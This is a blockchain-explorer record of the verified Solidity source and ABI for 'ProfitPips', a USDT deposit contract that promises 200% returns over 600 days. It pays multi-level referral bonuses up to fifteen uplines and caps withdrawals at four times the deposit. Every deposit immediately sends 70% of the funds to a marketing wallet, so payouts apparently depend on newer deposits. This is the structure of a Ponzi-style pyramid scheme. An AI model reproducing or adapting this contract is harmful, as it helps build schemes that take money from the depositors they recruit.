{"SourceCode": "//SPDX-License-Identifier: MIT\r\npragma solidity 0.7.6;\r\ncontract ProfitPips {\r\n    using SafeMath for uint256;\r\n     IBEP20 public usdt;\r\n     \r\n    struct Tarif {\r\n        uint256 life_days;\r\n        uint256 percent;\r\n        uint256 min_inv;\r\n\r\n    }\r\n\r\n    struct Deposit {\r\n        uint8 tarif;\r\n        uint256 amount;\r\n        uint256 totalWithdraw;\r\n        uint256 time;\r\n    }\r\n\r\n    struct Player {\r\n        address upline;\r\n        uint256 j_time;\r\n        uint256 dividends;\r\n        uint256 match_bonus;\r\n        uint256 last_payout;\r\n        uint256 gi_bonus;\r\n        uint256 total_invested;\r\n        uint256 total_withdrawn;\r\n        uint256 total_match_bonus;\r\n        Deposit[] deposits;\r\n        mapping(uint8 => uint256) structure;\r\n        mapping(uint8 => uint256) level_business;\r\n    }\r\n\r\n    address payable public owner;\r\n    address payable public marketing_wallet;\r\n    address payable public technical;\r\n    uint256[] public GI_PERCENT = [100,90,80,70,60,50,40,30,20,10,5,5,5,5,5];\r\n    uint256 public invested;\r\n    uint256 public gi_bonus;\r\n    uint256 public withdrawn;\r\n    uint256 public match_bonus;\r\n    uint256 public withdrawFee;\r\n\r\n    uint8[] public ref_bonuses;\r\n \r\n\r\n    Tarif[] public tarifs;\r\n    mapping(address => Player) public players;\r\n    \r\n\r\n    event Upline(address indexed addr, address indexed upline, uint256 bonus);\r\n    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n    event MatchPayoutStat(address upline,uint256 total_directs, uint256 level_b);\r\n\r\n    constructor(IBEP20  _usdt,address payable _marketing_wallet, address payable _technical)  {\r\n        owner = msg.sender;\r\n        marketing_wallet = _marketing_wallet;\r\n        usdt = _usdt;\r\n        technical = _technical;\r\n\r\n       \r\n        tarifs.push(Tarif(600, 200,100e18));  //0.33% for 600 days  = 200%\r\n        \r\n    }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n    function _payout(address _addr) private {\r\n        uint256 payout = this.payoutOf(_addr);\r\n\r\n        if(payout > 0) {\r\n            _updateTotalPayout(_addr);\r\n            players[_addr].last_payout = uint256(block.timestamp);\r\n            players[_addr].dividends += payout;\r\n        }\r\n    }\r\n\r\n    function _updateTotalPayout(address _addr) private{\r\n        Player storage player = players[_addr];\r\n\r\n        for(uint256 i = 0; i < player.deposits.length; i++) {\r\n            Deposit storage dep = player.deposits[i];\r\n            Tarif storage tarif = tarifs[dep.tarif];\r\n\r\n            uint256 time_end = dep.time + tarif.life_days * 86400;\r\n            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;\r\n            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);\r\n\r\n            if(from < to) {\r\n                player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;\r\n            }\r\n        }\r\n    }\r\n\r\n   \r\n\r\n    function _setUpline(address _addr, address _upline,uint256 amount) private {\r\n        if(players[_addr].upline == address(0)) {\r\n            if(players[_upline].deposits.length == 0) {\r\n                _upline = owner;\r\n            }\r\n            players[_addr].upline = _upline;\r\n            for(uint8 i = 0; i < GI_PERCENT.length; i++) {\r\n                players[_upline].structure[i]++;\r\n                 players[_upline].level_business[i] += amount;\r\n                _upline = players[_upline].upline;\r\n                if(_upline == address(0)) break;\r\n            }\r\n        }\r\n        \r\n         else\r\n             {\r\n                _upline = players[_addr].upline;\r\n            for( uint8 i = 0; i < GI_PERCENT.length; i++) {\r\n                     players[_upline].level_business[i] += amount;\r\n                    _upline = players[_upline].upline;\r\n                    if(_upline == address(0)) break;\r\n                }\r\n        }\r\n        \r\n    }\r\n\r\n    function deposit(uint8 _tarif, address _upline, uint256 token_quantity) external payable {\r\n        require(tarifs[_tarif].life_days > 0, \"Tarif not found\"); \r\n      \r\n     \r\n        require(token_quantity >= tarifs[_tarif].min_inv, \"Less Then the min investment\");\r\n       \r\n        \r\n       usdt.transferFrom(msg.sender, address(this), token_quantity);\r\n        Player storage player = players[msg.sender];\r\n\r\n        _setUpline(msg.sender,_upline,token_quantity);\r\n        player.deposits.push(Deposit({\r\n            tarif: _tarif,\r\n            amount:token_quantity,\r\n            totalWithdraw: 0,\r\n            time: uint256(block.timestamp) \r\n        }));\r\n        \r\n        \r\n        player.total_invested += token_quantity;\r\n        player.j_time =  uint256(block.timestamp);\r\n        invested += token_quantity;\r\n\r\n        _refPayout(msg.sender, token_quantity);\r\n\r\n         \r\n\r\n        usdt.transfer( marketing_wallet,token_quantity.mul(70).div(100));\r\n        emit NewDeposit(msg.sender, token_quantity, _tarif);\r\n    }\r\n\r\n\r\n    function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = players[_addr].upline;\r\n\r\n         if(up != address(0)){\r\n\r\n            uint256 bonus = _amount * 5 / 100;\r\n            players[up].match_bonus += bonus;\r\n            players[up].total_match_bonus += bonus;\r\n            match_bonus += bonus;\r\n            emit MatchPayout(up, _addr, bonus);\r\n\r\n         }\r\n    }\r\n\r\n    function withdraw() payable external {\r\n        Player storage player = players[msg.sender];\r\n\r\n        _payout(msg.sender);\r\n\r\n        require(player.dividends > 0 || player.match_bonus > 0 || player.gi_bonus > 0, \"Zero amount\");\r\n        uint256 amount = player.dividends + player.match_bonus + player.gi_bonus;\r\n\r\n        require(player.total_withdrawn < player.total_invested.mul(4),\"Reached to 4x cap\");\r\n\r\n        if(player.total_withdrawn.add(amount) > player.total_invested.mul(4))\r\n        {\r\n               amount =  player.total_invested.mul(4).sub(player.total_withdrawn);\r\n\r\n        }\r\n     \r\n        \r\n        _send_gi(msg.sender,player.dividends);\r\n        player.dividends = 0;\r\n        player.match_bonus = 0;\r\n        player.gi_bonus = 0;\r\n        player.total_withdrawn += amount;\r\n\r\n        \r\n        withdrawn += amount;\r\n\r\n        uint256 fees = amount.mul(5).div(100);\r\n        usdt.transfer(technical,fees);\r\n\r\n        amount -= fees;\r\n        usdt.transfer(msg.sender,amount);\r\n        emit Withdraw(msg.sender, amount);\r\n       \r\n    }\r\n\r\n\r\n    function _send_gi(address _addr, uint256 _amount) private {\r\n        address up = players[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < GI_PERCENT.length; i++) {\r\n            if(up == address(0)) break;\r\n\r\n            uint256 bonus = _amount * GI_PERCENT[i] / 1000;\r\n            players[up].gi_bonus += bonus;\r\n            gi_bonus += bonus;\r\n           \r\n            up = players[up].upline;\r\n         \r\n        }\r\n    }\r\n\r\n\r\n\r\n    function payoutOf(address _addr) view external returns(uint256 value) {\r\n        Player storage player = players[_addr];\r\n            for(uint256 i = 0; i < player.deposits.length; i++) {\r\n                Deposit storage dep = player.deposits[i];\r\n                Tarif storage tarif = tarifs[dep.tarif];\r\n\r\n                uint256 time_end = dep.time + tarif.life_days * 86400;\r\n                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;\r\n                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);\r\n\r\n                if(from < to) {\r\n                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;\r\n                }\r\n            }\r\n        return value;\r\n    }\r\n\r\n\r\n    /*\r\n        Only external call\r\n    */\r\n    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[] memory structure, uint256[] memory level_business) {\r\n        Player storage player = players[_addr];\r\n\r\n        uint256 payout = this.payoutOf(_addr);\r\n\r\n      structure = new uint256[](GI_PERCENT.length);\r\n       level_business = new uint256[](GI_PERCENT.length);\r\n\r\n        for(uint8 i = 0; i < GI_PERCENT.length; i++) {\r\n            structure[i] = player.structure[i];\r\n             level_business[i] = player.level_business[i];\r\n        }\r\n\r\n        return (\r\n            payout + player.dividends + player.match_bonus + player.gi_bonus,\r\n            player.match_bonus,\r\n            player.total_invested,\r\n            player.total_withdrawn,\r\n            player.total_match_bonus,\r\n            structure,\r\n            level_business\r\n        );\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn,uint256 _match_bonus) {\r\n        return (invested, withdrawn,match_bonus);\r\n    }\r\n\r\n    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {\r\n        Player storage player = players[_addr];\r\n\r\n        uint8[] memory _ids = new uint8[](player.deposits.length);\r\n        uint256[] memory _endTimes = new uint256[](player.deposits.length);\r\n        uint256[] memory _amounts = new uint256[](player.deposits.length);\r\n        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);\r\n\r\n        for(uint256 i = 0; i < player.deposits.length; i++) {\r\n          Deposit storage dep = player.deposits[i];\r\n          Tarif storage tarif = tarifs[dep.tarif];\r\n\r\n          _ids[i] = dep.tarif;\r\n          _amounts[i] = dep.amount;\r\n          _totalWithdraws[i] = dep.totalWithdraw;\r\n          _endTimes[i] = dep.time + tarif.life_days * 86400;\r\n        }\r\n\r\n        return (\r\n          _ids,\r\n          _endTimes,\r\n          _amounts,\r\n          _totalWithdraws\r\n        );\r\n    }\r\n\r\n\r\n\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b);\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a);\r\n\r\n        return c;\r\n    }\r\n\r\n}\r\ninterface IBEP20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"contract IBEP20\",\"name\":\"_usdt\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"_marketing_wallet\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"_technical\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"MatchPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"total_directs\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"level_b\",\"type\":\"uint256\"}],\"name\":\"MatchPayoutStat\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"tarif\",\"type\":\"uint8\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bonus\",\"type\":\"uint256\"}],\"name\":\"Upline\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"GI_PERCENT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_match_bonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_tarif\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"_upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"token_quantity\",\"type\":\"uint256\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gi_bonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"invested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"investmentsInfo\",\"outputs\":[{\"internalType\":\"uint8[]\",\"name\":\"ids\",\"type\":\"uint8[]\"},{\"internalType\":\"uint256[]\",\"name\":\"endTimes\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"totalWithdraws\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketing_wallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"match_bonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"payoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"players\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"j_time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"dividends\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"match_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"last_payout\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"gi_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_match_bonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ref_bonuses\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tarifs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"life_days\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"min_inv\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"technical\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"usdt\",\"outputs\":[{\"internalType\":\"contract IBEP20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"for_withdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawable_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_match_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256[]\",\"name\":\"structure\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"level_business\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ProfitPips", "CompilerVersion": "v0.7.6+commit.7338295f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000055d398326f99059ff775485246999027b319795500000000000000000000000089f38fcca74aa3d5678590de5775dd2d482603dd000000000000000000000000b00cbc147126ce1e16f9893f5c98bedaaa1dfca2", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e9d643ab0e2550ce4bfa0df79a2795db1caf34d694c2eb51d48d5c3381907d81"}